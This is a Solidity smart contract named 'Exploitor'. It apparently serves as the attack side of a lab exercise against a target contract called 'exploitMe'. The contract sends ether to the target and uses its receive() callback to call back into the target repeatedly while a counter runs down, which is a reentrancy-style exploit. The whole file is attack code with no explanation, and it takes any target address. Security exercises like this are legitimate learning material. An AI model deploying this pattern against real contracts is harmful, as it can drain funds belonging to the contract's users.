//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.11;

import "hardhat/console.sol";

contract Exploitor {

    address payable public exploitMeAddr;
    uint256 count;

    constructor (address payable _exploitMeAddress) public {
        exploitMeAddr = _exploitMeAddress;
    }

    function depositTricky(uint256 _count) payable external virtual {
        count = _count;
        (bool success, ) = exploitMeAddr.call{value: 0.7 ether }("");
        require(success, "ETH SEND FAILED");

        (success, ) = exploitMeAddr.call{value: 0.7 ether }("");
        require(success, "ETH SEND FAILED");

    }

    receive() external payable {
        console.log("\tExploitor receiving...ETH.", msg.value);

        if( count > 0) {
            count --;
            (bool success, ) = exploitMeAddr.call{value: 0.3 ether }("");
            require(success, "ETH SEND FAILED");
        }
    }
}